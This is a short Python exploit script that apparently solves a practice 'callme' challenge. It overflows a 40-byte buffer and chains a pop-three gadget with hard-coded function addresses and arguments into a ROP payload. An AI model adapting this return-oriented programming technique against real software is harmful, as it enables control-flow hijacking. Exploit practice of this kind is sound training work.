#!/usr/bin/env python
import struct

def p(x):
    return struct.pack("<Q", x)

# Function locations
callme_one   = p(0x00400720)
callme_two   = p(0x00400740)
callme_three = p(0x004006f0)

# Arguments required for each function
args     = p(0xdeadbeefdeadbeef) + p(0xcafebabecafebabe) + p(0xd00df00dd00df00d)

# Gadget: three pops
pop3_ret = p(0x0040093c)

# Overflow
buf = ' '*40

#callme_one
buf += pop3_ret
buf += args

buf += callme_one
buf += pop3_ret
buf += args

#callme_two
buf += callme_two
buf += pop3_ret
buf += args

#callme_three
buf += callme_three
buf += pop3_ret
buf += args

#clean exit
buf += pop3_ret

print(buf)
